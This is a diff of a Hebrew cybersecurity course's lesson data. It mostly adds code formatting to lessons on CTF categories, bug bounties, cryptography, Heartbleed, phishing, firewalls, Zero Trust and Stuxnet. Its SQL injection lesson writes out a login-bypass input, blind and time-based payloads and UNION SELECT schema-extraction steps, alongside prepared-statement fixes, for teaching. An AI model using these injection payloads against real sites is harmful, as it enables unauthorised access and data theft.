-  <tr><td>OSINT</td><td>גילוי מידע ממקורות ציבוריים</td><td>Maltego, theHarvester</td></tr>
+  <tr><td><code>Web</code></td><td><code>SQL injection</code>, <code>XSS</code>, <code>SSRF</code>, <code>deserialization</code></td><td><code>Burp Suite</code>, <code>sqlmap</code></td></tr>
+  <tr><td><code>Pwn</code> (Binary)</td><td><code>Buffer overflow</code>, <code>ROP chains</code>, <code>heap exploitation</code></td><td><code>pwndbg</code>, <code>pwntools</code>, <code>gdb</code></td></tr>
+  <tr><td><code>Crypto</code></td><td><code>RSA</code> attacks, <code>AES</code> modes, <code>hash collisions</code></td><td><code>Python</code>, <code>SageMath</code></td></tr>
+  <tr><td><code>Forensics</code></td><td>ניתוח <code>memory dumps</code>, <code>steganography</code>, <code>PCAP</code></td><td><code>Autopsy</code>, <code>Volatility</code>, <code>Wireshark</code></td></tr>
+  <tr><td><code>Reverse Engineering</code></td><td><code>disassembly</code>, <code>decompilation</code>, <code>anti-debug</code></td><td><code>Ghidra</code>, <code>IDA</code>, <code>x64dbg</code></td></tr>
+  <tr><td><code>OSINT</code></td><td>גילוי מידע ממקורות ציבוריים</td><td><code>Maltego</code>, <code>theHarvester</code></td></tr>
 </table>
 <p><strong>פלטפורמות לתרגול</strong></p>
 <ul>
-<li><strong>HackTheBox</strong> — מכונות לpwn ו-CTF challenges. הכי פופולרי.</li>
-<li><strong>TryHackMe</strong> — guided learning paths, מתחילים ידידותי</li>
-<li><strong>PicoCTF</strong> — קל יותר, מצוין למתחילים</li>
-<li><strong>CTFtime.org</strong> — לוח תחרויות עולמי</li>
-<li><strong>PortSwigger Web Academy</strong> — web labs חינמיים</li>
+<li><strong><code>HackTheBox</code></strong> — מכונות ל-<code>pwn</code> ו-<code>CTF</code> challenges. הכי פופולרי.</li>
+<li><strong><code>TryHackMe</code></strong> — guided learning paths, מתחילים ידידותי</li>
+<li><strong><code>PicoCTF</code></strong> — קל יותר, מצוין למתחילים</li>
+<li><strong><code>CTFtime.org</code></strong> — לוח תחרויות עולמי</li>
+<li><strong><code>PortSwigger Web Academy</code></strong> — <code>web labs</code> חינמיים</li>
 </ul>
 </div>`
       },
@@ -6117,17 +6117,17 @@ index=windows EventCode=4624
 <p>לפי נתוני <code>HackerOne</code> מ-2023, חוקר אחד הרוויח 4 מיליון דולר לאורך הקריירה שלו.</p>
 <table class="content-table">
   <tr><th>פלטפורמה</th><th>מי שם</th><th>טווח תשלומים</th></tr>
-  <tr><td>HackerOne</td><td>Google, Apple, Microsoft, US DoD</td><td>$100 — $100,000+</td></tr>
-  <tr><td>Bugcrowd</td><td>Tesla, Mastercard, Atlassian</td><td>$50 — $50,000</td></tr>
-  <tr><td>Intigriti</td><td>חברות אירופיות, NATO</td><td>€100 — €20,000</td></tr>
-  <tr><td>Synack</td><td>invitation-only, US Gov</td><td>גבוה מאוד</td></tr>
+  <tr><td><code>HackerOne</code></td><td><code>Google</code>, <code>Apple</code>, <code>Microsoft</code>, <code>US DoD</code></td><td>$100 — $100,000+</td></tr>
+  <tr><td><code>Bugcrowd</code></td><td><code>Tesla</code>, <code>Mastercard</code>, <code>Atlassian</code></td><td>$50 — $50,000</td></tr>
+  <tr><td><code>Intigriti</code></td><td>חברות אירופיות, <code>NATO</code></td><td>€100 — €20,000</td></tr>
+  <tr><td><code>Synack</code></td><td>invitation-only, <code>US Gov</code></td><td>גבוה מאוד</td></tr>
 </table>
 <p><strong>Vulnerability Classifications ותשלומים</strong></p>
 <ul>
-<li><strong>Critical</strong> (RCE, Authentication bypass): $5,000–$100,000+</li>
-<li><strong>High</strong> (SQLi, SSRF, IDOR sensitive data): $1,000–$10,000</li>
-<li><strong>Medium</strong> (XSS stored, CSRF, info disclosure): $100–$1,000</li>
-<li><strong>Low/Info</strong>: $50–$200</li>
+<li><strong><code>Critical</code></strong> (<code>RCE</code>, <code>Authentication bypass</code>): $5,000–$100,000+</li>
+<li><strong><code>High</code></strong> (<code>SQLi</code>, <code>SSRF</code>, <code>IDOR</code> sensitive data): $1,000–$10,000</li>
+<li><strong><code>Medium</code></strong> (<code>XSS</code> stored, <code>CSRF</code>, info disclosure): $100–$1,000</li>
+<li><strong><code>Low/Info</code></strong>: $50–$200</li>
 </ul>
 <p><strong>Disclosure Process</strong></p>
 <ol>
@@ -6183,7 +6183,7 @@ index=windows EventCode=4624
 <table class="content-table">
   <tr><th>סוג</th><th>עיקרון</th><th>מפתחות</th><th>מהירות</th><th>שימוש</th></tr>
   <tr><td><strong>סימטרי</strong></td><td>אותו מפתח להצפנה ופענוח</td><td>מפתח סודי אחד משותף</td><td>מהיר מאוד</td><td>הצפנת קבצים, HTTPS payload</td></tr>
-  <tr><td><strong>אסימטרי</strong></td><td>זוג מפתחות: ציבורי + פרטי</td><td>Public Key / Private Key</td><td>איטי יותר</td><td>חתימות, TLS handshake, SSH</td></tr>
+  <tr><td><strong>אסימטרי</strong></td><td>זוג מפתחות: ציבורי + פרטי</td><td>Public Key / Private Key</td><td>איטי יותר</td><td>חתימות, <code>TLS handshake</code>, <code>SSH</code></td></tr>
 </table>
 <p><strong>AES — Advanced Encryption Standard</strong></p>
 <p><code>AES</code> הוא תקן ההצפנה הסימטרית הנפוץ ביותר בעולם.</p>
@@ -6192,7 +6192,7 @@ index=windows EventCode=4624
 <ul>
 <li><strong>AES-128</strong> — 128-bit key, 10 rounds. מהיר ומספיק לרוב השימושים</li>
 <li><strong>AES-256</strong> — 256-bit key, 14 rounds. משמש סיווג Top Secret בממשל האמריקאי</li>
-<li><strong>Modes:</strong> CBC (Cipher Block Chaining), GCM (Galois/Counter Mode — מומלץ כיום)</li>
+<li><strong>Modes:</strong> <code>CBC</code> (Cipher Block Chaining), <code>GCM</code> (Galois/Counter Mode — מומלץ כיום)</li>
 </ul>
 <p><strong>RSA — Rivest–Shamir–Adleman</strong></p>
 <p><code>RSA</code> הוא אלגוריתם ההצפנה האסימטרית הנפוץ ביותר.</p>
@@ -6251,9 +6251,9 @@ print(recovered)  # b'secret data'</code></pre>
 <p>הדפדפן מקבל <code>certificate</code> מהשרת שמכיל את ה-<code>Public Key</code>.</p>
 <p><strong>Certificate Authority (<code>CA</code>)</strong> הוא גוף מהימן שחתם על התעודה ומאשר שהשרת הוא מי שהוא טוען.</p>
 <ul>
-<li>Let's Encrypt — CA חינמי ואוטומטי, 300M+ certificates</li>
-<li>DigiCert, Sectigo — commercial CAs</li>
-<li>TLS 1.3 (2018) — מהיר יותר, מחייב Perfect Forward Secrecy</li>
+<li><code>Let's Encrypt</code> — <code>CA</code> חינמי ואוטומטי, 300M+ certificates</li>
+<li><code>DigiCert</code>, <code>Sectigo</code> — commercial CAs</li>
+<li><code>TLS 1.3</code> (2018) — מהיר יותר, מחייב <code>Perfect Forward Secrecy</code></li>
 </ul>
 </div>`
       },
@@ -6261,22 +6261,22 @@ print(recovered)  # b'secret data'</code></pre>
         type: "explanation",
         title: "הצפנה בפועל — WhatsApp ו-HTTPS",
         content: `<div dir="rtl">
-<p><strong>End-to-End Encryption — WhatsApp Signal Protocol</strong></p>
-<p>WhatsApp משתמשת ב-Signal Protocol — אחד הפרוטוקולים המאובטחים ביותר.</p>
+<p><strong><code>End-to-End Encryption</code> — <code>WhatsApp</code> <code>Signal Protocol</code></strong></p>
+<p><code>WhatsApp</code> משתמשת ב-<code>Signal Protocol</code> — אחד הפרוטוקולים המאובטחים ביותר.</p>
 <p>כשאתה שולח הודעה:</p>
 <ol>
-<li>המכשיר מייצר זוג מפתחות ייחודי לכל שיחה (Double Ratchet Algorithm)</li>
-<li>ההודעה מוצפנת ב-AES-256 עם מפתח שרק הנמען יכול לפענח</li>
-<li>WhatsApp עצמה לא יכולה לקרוא את ההודעות</li>
-<li>המפתחות משתנים כל הודעה — Perfect Forward Secrecy</li>
+<li>המכשיר מייצר זוג מפתחות ייחודי לכל שיחה (<code>Double Ratchet Algorithm</code>)</li>
+<li>ההודעה מוצפנת ב-<code>AES-256</code> עם מפתח שרק הנמען יכול לפענח</li>
+<li><code>WhatsApp</code> עצמה לא יכולה לקרוא את ההודעות</li>
+<li>המפתחות משתנים כל הודעה — <code>Perfect Forward Secrecy</code></li>
 </ol>
 <p><strong>HTTPS בפועל — מה המנעול בדפדפן אומר</strong></p>
 <table class="content-table">
   <tr><th>מה רואים</th><th>מה זה אומר</th></tr>
-  <tr><td>מנעול / HTTPS</td><td>התקשורת מוצפנת, Certificate תקף</td></tr>
-  <tr><td>Certificate Error</td><td>Certificate פג תוקף / שם דומיין שגוי / לא חתום ע"י CA מוכר</td></tr>
-  <tr><td>Mixed Content</td><td>דף HTTPS שטוען משאבים ב-HTTP</td></tr>
-  <tr><td>HSTS Header</td><td>הדפדפן מאלץ HTTPS לכל הבקשות לדומיין</td></tr>
+  <tr><td>מנעול / <code>HTTPS</code></td><td>התקשורת מוצפנת, <code>Certificate</code> תקף</td></tr>
+  <tr><td><code>Certificate Error</code></td><td><code>Certificate</code> פג תוקף / שם דומיין שגוי / לא חתום ע"י <code>CA</code> מוכר</td></tr>
+  <tr><td><code>Mixed Content</code></td><td>דף <code>HTTPS</code> שטוען משאבים ב-<code>HTTP</code></td></tr>
+  <tr><td><code>HSTS Header</code></td><td>הדפדפן מאלץ <code>HTTPS</code> לכל הבקשות לדומיין</td></tr>
 </table>
 <p><strong>RSA ב-Python (simplified)</strong></p>
 <pre><code>from cryptography.hazmat.primitives.asymmetric import rsa, padding
@@ -6301,7 +6301,7 @@ print(plaintext)  # b'secret message'</code></pre>
         title: "הסיפור: Heartbleed — הבאג שפגע בחצי האינטרנט",
         content: `<div dir="rtl">
 <p><strong>Heartbleed 2014 — CVE-2014-0160</strong></p>
-<p>אפריל 2014: חוקרים מ-Google ו-Codenomicon גילו bug קריטי ב-OpenSSL — הספרייה שמפעילה TLS על 66% מהאינטרנט.</p>
+<p>אפריל 2014: חוקרים מ-Google ו-Codenomicon גילו bug קריטי ב-<code>OpenSSL</code> — הספרייה שמפעילה <code>TLS</code> על 66% מהאינטרנט.</p>
 <p><strong>מה הבאג עשה:</strong></p>
 <p>ל-<code>OpenSSL</code> הייתה תכונת <code>Heartbeat</code> — הלקוח שולח הודעה קטנה, והשרת מחזיר אותה כאישור שהחיבור חי.</p>
 <p><strong>הבעיה:</strong> לא נבדק שהגודל שהלקוח ביקש תואם לגודל ההודעה בפועל.</p>
@@ -6315,9 +6315,9 @@ print(plaintext)  # b'secret message'</code></pre>
 <p><strong>הלקחים:</strong></p>
 <ul>
 <li>קוד קריטי לאבטחה חייב code review קפדני, fuzzing ו-formal verification</li>
-<li>Memory safety חשובה — Rust נכתב כדי למנוע בעיות כאלה</li>
+<li><code>Memory safety</code> חשובה — <code>Rust</code> נכתב כדי למנוע בעיות כאלה</li>
 <li>גם אחרי patch, כל שרת היה חייב להחליף certificates</li>
-<li>FOSS קריטי צריך מימון מקצועי — OpenSSL Core Infrastructure Initiative</li>
+<li><code>FOSS</code> קריטי צריך מימון מקצועי — <code>OpenSSL Core Infrastructure Initiative</code></li>
 </ul>
 <p><code>Heartbleed</code> שינה תפיסות: האינטרנט בנוי על קוד <code>open-source</code> שנכתב לעתים על ידי מתנדבים.</p>
 <p>המסקנה: נדרשת השקעה מוסדית ומקצועית בבדיקות אבטחה של תשתיות קריטיות.</p>
@@ -6350,10 +6350,10 @@ print(plaintext)  # b'secret message'</code></pre>
 </table>
 <p><strong>סוגי Phishing</strong></p>
 <ul>
-<li><strong>Mass Phishing</strong> — מיליוני מיילים זהים. Low effort, success rate 2-5%</li>
-<li><strong>Spear Phishing</strong> — מותאם אישית לאדם ספציפי עם מידע מLinkedIn</li>
-<li><strong>Whaling</strong> — Spear Phishing נגד CEO/CFO. לעתים: "שלח העברה דחופה"</li>
-<li><strong>Clone Phishing</strong> — העתק של מייל לגיטימי שנשלח בעבר, עם קישור זדוני</li>
+<li><strong><code>Mass Phishing</code></strong> — מיליוני מיילים זהים. Low effort, success rate 2-5%</li>
+<li><strong>Spear Phishing</strong> — מותאם אישית לאדם ספציפי עם מידע מ-<code>LinkedIn</code></li>
+<li><strong><code>Whaling</code></strong> — <code>Spear Phishing</code> נגד <code>CEO</code>/<code>CFO</code>. לעתים: "שלח העברה דחופה"</li>
+<li><strong><code>Clone Phishing</code></strong> — העתק של מייל לגיטימי שנשלח בעבר, עם קישור זדוני</li>
 </ul>
 </div>`
       },
@@ -6365,11 +6365,11 @@ print(plaintext)  # b'secret message'</code></pre>
 <p><code>Social Engineering</code> לא מסתכם במיילים. כל ערוץ תקשורת יכול לשמש כוקטור תקיפה:</p>
 <table class="content-table">
   <tr><th>שם</th><th>ערוץ</th><th>דוגמה</th><th>הגנה</th></tr>
-  <tr><td><strong>Vishing</strong></td><td>שיחת טלפון</td><td>"בנק לאומי — נחסמה הכרטיס שלך"</td><td>נתק וחזור למספר הרשמי</td></tr>
-  <tr><td><strong>Smishing</strong></td><td>SMS</td><td>"חבילה ממתינה — לחץ לאימות"</td><td>אל תלחץ על קישורי SMS</td></tr>
-  <tr><td><strong>Pretexting</strong></td><td>כל ערוץ</td><td>מתחזה לIT support</td><td>אמת זהות בצינור נפרד</td></tr>
-  <tr><td><strong>Baiting</strong></td><td>פיזי</td><td>USB drive שנמצא בחניה</td><td>אל תחבר מדיה לא מוכרת</td></tr>
-  <tr><td><strong>Tailgating</strong></td><td>פיזי</td><td>כניסה לבניין מאחורי עובד</td><td>אל תחזיק דלת לזרים</td></tr>
+  <tr><td><strong><code>Vishing</code></strong></td><td>שיחת טלפון</td><td>"בנק לאומי — נחסמה הכרטיס שלך"</td><td>נתק וחזור למספר הרשמי</td></tr>
+  <tr><td><strong><code>Smishing</code></strong></td><td>SMS</td><td>"חבילה ממתינה — לחץ לאימות"</td><td>אל תלחץ על קישורי SMS</td></tr>
+  <tr><td><strong><code>Pretexting</code></strong></td><td>כל ערוץ</td><td>מתחזה ל<code>IT</code> support</td><td>אמת זהות בצינור נפרד</td></tr>
+  <tr><td><strong><code>Baiting</code></strong></td><td>פיזי</td><td><code>USB drive</code> שנמצא בחניה</td><td>אל תחבר מדיה לא מוכרת</td></tr>
+  <tr><td><strong><code>Tailgating</code></strong></td><td>פיזי</td><td>כניסה לבניין מאחורי עובד</td><td>אל תחזיק דלת לזרים</td></tr>
 </table>
 <p><strong>עקרונות Cialdini — למה Social Engineering עובד</strong></p>
 <ul>
@@ -6411,9 +6411,9 @@ print(plaintext)  # b'secret message'</code></pre>
 </ul>
 <p><strong>המסקנות:</strong></p>
 <ul>
-<li>גישה ל-Admin tools חייבת MFA חזק — לא רק סיסמה</li>
+<li>גישה ל-<code>Admin tools</code> חייבת <code>MFA</code> חזק — לא רק סיסמה</li>
 <li>עובדים חייבים לאמת זהות בבקשות רגישות דרך ערוץ נפרד</li>
-<li>Privileged access לכלים פנימיים צריך Zero Trust — least privilege, logging, anomaly detection</li>
+<li><code>Privileged access</code> לכלים פנימיים צריך <code>Zero Trust</code> — <code>least privilege</code>, <code>logging</code>, <code>anomaly detection</code></li>
 <li>Security awareness training הוא הגנה קריטית</li>
 </ul>
 <p>Clark גזר 3 שנות מאסר.</p>
@@ -6425,22 +6425,22 @@ print(plaintext)  # b'secret message'</code></pre>
         title: "הגנה מפני Social Engineering",
         content: `<div dir="rtl">
 <p><strong>כיצד ארגונים מתגוננים מפני האיום האנושי</strong></p>
-<p><strong>Security Awareness Training</strong></p>
+<p><strong><code>Security Awareness Training</code></strong></p>
 <p>ההגנה הטובה ביותר היא חינוך. ארגונים מבצעים:</p>
 <ul>
-<li><strong>Phishing Simulations</strong> — שליחת phishing מזויף לעובדים ומדידת אחוזי לחיצה</li>
-<li><strong>Security Training</strong> — כיצד לזהות מניפולציה, מה לדווח</li>
-<li><strong>Tabletop Exercises</strong> — סימולציות תרחישי תקיפה עם ההנהלה</li>
+<li><strong><code>Phishing Simulations</code></strong> — שליחת phishing מזויף לעובדים ומדידת אחוזי לחיצה</li>
+<li><strong><code>Security Training</code></strong> — כיצד לזהות מניפולציה, מה לדווח</li>
+<li><strong><code>Tabletop Exercises</code></strong> — סימולציות תרחישי תקיפה עם ההנהלה</li>
 </ul>
 <p><strong>תהליכים טכניים</strong></p>
 <table class="content-table">
   <tr><th>איום</th><th>הגנה טכנית</th></tr>
-  <tr><td>Email Phishing</td><td>SPF + DKIM + DMARC, Email Gateway, sandbox לattachments</td></tr>
-  <tr><td>Credential Theft</td><td>MFA חזק (FIDO2 / hardware token), Password Manager</td></tr>
-  <tr><td>Insider Threat</td><td>Least Privilege, DLP, User Behavior Analytics</td></tr>
-  <tr><td>CEO Fraud</td><td>Dual approval להעברות כספיות, אימות OOB</td></tr>
+  <tr><td><code>Email Phishing</code></td><td><code>SPF</code> + <code>DKIM</code> + <code>DMARC</code>, <code>Email Gateway</code>, <code>sandbox</code> ל-attachments</td></tr>
+  <tr><td><code>Credential Theft</code></td><td><code>MFA</code> חזק (<code>FIDO2</code> / <code>hardware token</code>), <code>Password Manager</code></td></tr>
+  <tr><td><code>Insider Threat</code></td><td><code>Least Privilege</code>, <code>DLP</code>, <code>User Behavior Analytics</code></td></tr>
+  <tr><td><code>CEO Fraud</code></td><td><code>Dual approval</code> להעברות כספיות, אימות <code>OOB</code></td></tr>
 </table>
-<p><strong>עיקרון ה-Zero Trust כהגנה</strong></p>
+<p><strong>עיקרון ה-<code>Zero Trust</code> כהגנה</strong></p>
 <p>"Never Trust, Always Verify" — גם עובד פנימי צריך לאמת את זהותו לפני כל גישה למשאבים.</p>
 <p>גם אם מישהו גונב פרטי התחברות — <code>MFA</code> ו-<code>Device Trust</code> מקשים משמעותית על ניצולם.</p>
 <p><strong>הכלל החשוב ביותר:</strong> אם בקשה נראית חשודה — נתק, אמת, ואז תגיב.</p>
@@ -6462,12 +6462,12 @@ print(plaintext)  # b'secret message'</code></pre>
 <p>לאורך השנים התפתחו מספר דורות:</p>
 <table class="content-table">
   <tr><th>סוג</th><th>שכבה (OSI)</th><th>מה בודק</th><th>יתרון</th><th>חיסרון</th></tr>
-  <tr><td><strong>Stateless</strong></td><td>L3/L4</td><td>IP src/dst, Port, Protocol</td><td>מהיר מאוד</td><td>לא מבין context</td></tr>
-  <tr><td><strong>Stateful</strong></td><td>L4</td><td>Connection state (SYN/ESTABLISHED)</td><td>מבין TCP sessions</td><td>לא מבין תוכן L7</td></tr>
-  <tr><td><strong>NGFW</strong></td><td>L7</td><td>HTTP content, DNS, TLS SNI</td><td>מבין פרוטוקולים</td><td>יקר, עומס CPU</td></tr>
-  <tr><td><strong>WAF</strong></td><td>L7 HTTP</td><td>SQL injection, XSS, OWASP Top 10</td><td>הגנה על web apps</td><td>מוגבל ל-HTTP</td></tr>
+  <tr><td><strong><code>Stateless</code></strong></td><td>L3/L4</td><td><code>IP</code> src/dst, <code>Port</code>, <code>Protocol</code></td><td>מהיר מאוד</td><td>לא מבין <code>context</code></td></tr>
+  <tr><td><strong><code>Stateful</code></strong></td><td>L4</td><td><code>Connection state</code> (<code>SYN</code>/<code>ESTABLISHED</code>)</td><td>מבין <code>TCP sessions</code></td><td>לא מבין תוכן <code>L7</code></td></tr>
+  <tr><td><strong><code>NGFW</code></strong></td><td>L7</td><td><code>HTTP</code> content, <code>DNS</code>, <code>TLS SNI</code></td><td>מבין פרוטוקולים</td><td>יקר, עומס CPU</td></tr>
+  <tr><td><strong><code>WAF</code></strong></td><td>L7 HTTP</td><td><code>SQL injection</code>, <code>XSS</code>, <code>OWASP Top 10</code></td><td>הגנה על web apps</td><td>מוגבל ל-<code>HTTP</code></td></tr>
 </table>
-<p><strong>iptables — Stateless Firewall ב-Linux</strong></p>
+<p><strong><code>iptables</code> — <code>Stateless Firewall</code> ב-<code>Linux</code></strong></p>
 <pre><code># SSH רק מ-IP ספציפי
 iptables -A INPUT -p tcp --dport 22 -s 10.0.0.5 -j ACCEPT
 iptables -A INPUT -p tcp --dport 22 -j DROP
@@ -6484,7 +6484,7 @@ iptables -P OUTPUT ACCEPT
 # הצג חוקים
 iptables -L -n -v --line-numbers</code></pre>
 <p><strong>Default Deny vs Default Allow</strong></p>
-<p><strong>Whitelist (Default Deny)</strong> — חסום הכל, ופתח רק את מה שנדרש באופן מפורש.</p>
+<p><strong><code>Whitelist</code> (<code>Default Deny</code>)</strong> — חסום הכל, ופתח רק את מה שנדרש באופן מפורש.</p>
 <p>זה נשמע הפוך מהאינסטינקט — אבל גישה זו מאובטחת בהרבה מ-<code>Default Allow</code>.</p>
 </div>`
       },
@@ -6555,22 +6555,22 @@ iptables -L -n -v --line-numbers</code></pre>
 <p><strong>עקרונות Zero Trust</strong></p>
 <table class="content-table">
   <tr><th>עיקרון</th><th>מה זה אומר בפועל</th></tr>
-  <tr><td>Verify Explicitly</td><td>MFA, Device Posture Check, User Context — לכל גישה</td></tr>
-  <tr><td>Least Privilege</td><td>גישה מינימלית הנדרשת, Just-In-Time access</td></tr>
-  <tr><td>Assume Breach</td><td>תכנן כאילו התוקף כבר פנימה. Microsegmentation, Logging</td></tr>
+  <tr><td><code>Verify Explicitly</code></td><td><code>MFA</code>, <code>Device Posture Check</code>, <code>User Context</code> — לכל גישה</td></tr>
+  <tr><td><code>Least Privilege</code></td><td>גישה מינימלית הנדרשת, <code>Just-In-Time</code> access</td></tr>
+  <tr><td><code>Assume Breach</code></td><td>תכנן כאילו התוקף כבר פנימה. <code>Microsegmentation</code>, <code>Logging</code></td></tr>
 </table>
 <p><strong>Network Segmentation</strong></p>
 <ul>
-<li><strong>VLAN</strong> — בידוד ברמת L2. שרתי HR נפרדים מDevelopment</li>
-<li><strong>Microsegmentation</strong> — כל workload מבודד (VMware NSX, Cilium)</li>
-<li><strong>Software-Defined Perimeter</strong> — חיבורים נוצרים רק לפי בקשה מאומתת</li>
+<li><strong><code>VLAN</code></strong> — בידוד ברמת <code>L2</code>. שרתי HR נפרדים מ-Development</li>
+<li><strong><code>Microsegmentation</code></strong> — כל <code>workload</code> מבודד (<code>VMware NSX</code>, <code>Cilium</code>)</li>
+<li><strong><code>Software-Defined Perimeter</code></strong> — חיבורים נוצרים רק לפי בקשה מאומתת</li>
 </ul>
 <p><strong>כלים מודרניים</strong></p>
 <ul>
-<li><strong>Cloudflare Access / Zscaler</strong> — Zero Trust access לapps ללא VPN</li>
-<li><strong>CrowdStrike Falcon</strong> — EDR עם Zero Trust policy</li>
-<li><strong>Microsoft Entra ID</strong> — Conditional Access, MFA, Device Compliance</li>
-<li><strong>HashiCorp Vault</strong> — Dynamic secrets, Just-In-Time credentials</li>
+<li><strong><code>Cloudflare Access</code> / <code>Zscaler</code></strong> — <code>Zero Trust</code> access ל-apps ללא <code>VPN</code></li>
+<li><strong><code>CrowdStrike Falcon</code></strong> — <code>EDR</code> עם <code>Zero Trust</code> policy</li>
+<li><strong><code>Microsoft Entra ID</code></strong> — <code>Conditional Access</code>, <code>MFA</code>, <code>Device Compliance</code></li>
+<li><strong><code>HashiCorp Vault</code></strong> — <code>Dynamic secrets</code>, <code>Just-In-Time</code> credentials</li>
 </ul>
 </div>`
       },
@@ -6586,22 +6586,22 @@ iptables -L -n -v --line-numbers</code></pre>
 <li>משימה ספציפית מאוד</li>
 </ul>
 <p><strong>המטרה:</strong> מתקן העשרת אורניום ב-Natanz, איראן.</p>
-<p>הצנטריפוגות הונעו על ידי בקרים תעשייתיים — <code>PLCs</code> (Programmable Logic Controllers) של Siemens.</p>
+<p>הצנטריפוגות הונעו על ידי בקרים תעשייתיים — <code>PLCs</code> (<code>Programmable Logic Controllers</code>) של Siemens.</p>
 <p><strong>האיך זה עבד:</strong></p>
 <ol>
-<li>Stuxnet הופץ דרך USB drives (הרשת הייתה air-gapped)</li>
-<li>הגיע למחשבי Windows שמנהלים את הPLCs</li>
-<li>הסתיר את עצמו מ-SCADA monitoring — הציג ערכים "נורמליים"</li>
+<li>Stuxnet הופץ דרך <code>USB drives</code> (הרשת הייתה <code>air-gapped</code>)</li>
+<li>הגיע למחשבי <code>Windows</code> שמנהלים את ה-<code>PLCs</code></li>
+<li>הסתיר את עצמו מ-<code>SCADA</code> monitoring — הציג ערכים "נורמליים"</li>
 <li>שינה את מהירות הצנטריפוגות — פעם מהר מדי, פעם לאט מדי</li>
 <li>כ-1,000 מתוך 5,000 הצנטריפוגות הושמדו</li>
 </ol>
-<p><strong>לקחים לאבטחת תשתיות ICS/SCADA:</strong></p>
+<p><strong>לקחים לאבטחת תשתיות <code>ICS</code>/<code>SCADA</code>:</strong></p>
 <ul>
-<li>Air Gap לא מספיק — USB הוא וקטור תקיפה</li>
-<li>OT/ICS networks חייבים Segmentation מוחלט מIT networks</li>
-<li>PLCs וציוד תעשייתי לא תוכננו עם security — הם vulnerable by design</li>
-<li>Network Monitoring ב-ICS חייב לכלול anomaly detection</li>
-<li>Defense in Depth: firewall, application whitelisting, patch management</li>
+<li><code>Air Gap</code> לא מספיק — <code>USB</code> הוא וקטור תקיפה</li>
+<li><code>OT</code>/<code>ICS networks</code> חייבים <code>Segmentation</code> מוחלט מ-<code>IT networks</code></li>
+<li><code>PLCs</code> וציוד תעשייתי לא תוכננו עם security — הם vulnerable by design</li>
+<li><code>Network Monitoring</code> ב-<code>ICS</code> חייב לכלול <code>anomaly detection</code></li>
+<li><code>Defense in Depth</code>: <code>firewall</code>, <code>application whitelisting</code>, <code>patch management</code></li>
 </ul>
 <p><code>Stuxnet</code> הוכיח שקוד מחשב יכול לגרום לנזק פיזי ממשי.</p>
 <p>האחריות מיוחסת לארה"ב וישראל.</p>
@@ -6621,7 +6621,7 @@ iptables -L -n -v --line-numbers</code></pre>
 <p><strong>SQL Injection — פגיעות מספר 1 ב-Web</strong></p>
 <p><code>SQL Injection</code> מתרחשת כשהאפליקציה בונה שאילתת <code>SQL</code> ממחרוזת שמגיעה מהמשתמש, בלי לסנן אותה.</p>
 <p>התוצאה: התוקף יכול לשנות את הלוגיקה של השאילתה ולבצע פעולות שלא תוכננו.</p>
-<p><strong>דוגמה קלאסית — Login Bypass</strong></p>
+<p><strong>דוגמה קלאסית — <code>Login Bypass</code></strong></p>
 <div class="code-preview"><pre><code># קוד PHP פגיע
 $query = "SELECT * FROM users WHERE username='" . $_POST['user'] . "' AND password='" . $_POST['pass'] . "'";
 
@@ -6632,15 +6632,15 @@ $query = "SELECT * FROM users WHERE username='" . $_POST['user'] . "' AND passwo
 # שאילתה שנוצרת:
 SELECT * FROM users WHERE username='admin'--' AND password='anything'
 # -- מבטל את שאר השאילתה → מחזיר admin ללא בדיקת סיסמה!</code></pre></div>
-<p><strong>סוגי SQL Injection</strong></p>
+<p><strong>סוגי <code>SQL Injection</code></strong></p>
 <table class="content-table">
   <tr><th>סוג</th><th>תיאור</th><th>דוגמה</th></tr>
-  <tr><td><strong>Classic/In-band</strong></td><td>תוצאה חוזרת ישירות</td><td>UNION SELECT, Error-based</td></tr>
-  <tr><td><strong>Blind Boolean</strong></td><td>שאלות כן/לא — אין error</td><td><code>AND 1=1</code> vs <code>AND 1=2</code></td></tr>
-  <tr><td><strong>Time-based Blind</strong></td><td>מדידת זמן תגובה</td><td><code>AND SLEEP(5)</code></td></tr>
-  <tr><td><strong>Out-of-band</strong></td><td>נתונים לשרת חיצוני</td><td>DNS exfiltration</td></tr>
+  <tr><td><strong><code>Classic/In-band</code></strong></td><td>תוצאה חוזרת ישירות</td><td><code>UNION SELECT</code>, <code>Error-based</code></td></tr>
+  <tr><td><strong><code>Blind Boolean</code></strong></td><td>שאלות כן/לא — אין <code>error</code></td><td><code>AND 1=1</code> vs <code>AND 1=2</code></td></tr>
+  <tr><td><strong><code>Time-based Blind</code></strong></td><td>מדידת זמן תגובה</td><td><code>AND SLEEP(5)</code></td></tr>
+  <tr><td><strong><code>Out-of-band</code></strong></td><td>נתונים לשרת חיצוני</td><td><code>DNS exfiltration</code></td></tr>
 </table>
-<p><strong>UNION-based Extraction</strong></p>
+<p><strong><code>UNION-based Extraction</code></strong></p>
 <div class="code-preview"><pre><code># שלב 1: גלה כמה עמודות יש
 ' ORDER BY 1-- → ok
 ' ORDER BY 2-- → ok
@@ -6655,7 +6655,7 @@ SELECT * FROM users WHERE username='admin'--' AND password='anything'
 
 # שלב 4: גלה database schema
 ' UNION SELECT table_name,NULL FROM information_schema.tables--</code></pre></div>
-<p><strong>מניעה — Prepared Statements</strong></p>
+<p><strong>מניעה — <code>Prepared Statements</code></strong></p>
 <div class="code-preview"><pre><code># Python - SQLite (פגיע)
 cursor.execute(f"SELECT * FROM users WHERE name='{user_input}'")
 
@@ -6676,17 +6676,17 @@ ps.setString(2, password);</code></pre></div>
         type: "explanation",
         title: "XSS — Cross-Site Scripting",
         content: `<div dir="rtl">
-<p><strong>XSS — הזרקת JavaScript לדפדפן הקורבן</strong></p>
+<p><strong><code>XSS</code> — הזרקת <code>JavaScript</code> לדפדפן הקורבן</strong></p>
 <p><code>XSS</code> מאפשרת לתוקף להריץ <code>JavaScript</code> בהקשר של האתר המותקף, בדפדפן של קורבן אחר.</p>
 <p>ההבדל מ-<code>SQL Injection</code>: היעד הוא הדפדפן של המשתמש, לא מסד הנתונים.</p>
-<p><strong>3 סוגי XSS</strong></p>
+<p><strong>3 סוגי <code>XSS</code></strong></p>
 <table class="content-table">
   <tr><th>סוג</th><th>מאפיין</th><th>כיצד עובד</th></tr>
-  <tr><td><strong>Reflected</strong></td><td>לא נשמר</td><td>Payload ב-URL → חוזר ישירות ב-response</td></tr>
-  <tr><td><strong>Stored/Persistent</strong></td><td>נשמר ב-DB</td><td>Payload נשמר → רץ על כל visitor</td></tr>
-  <tr><td><strong>DOM-based</strong></td><td>ב-JavaScript</td><td>Payload ב-fragment/location → DOM manipulation</td></tr>
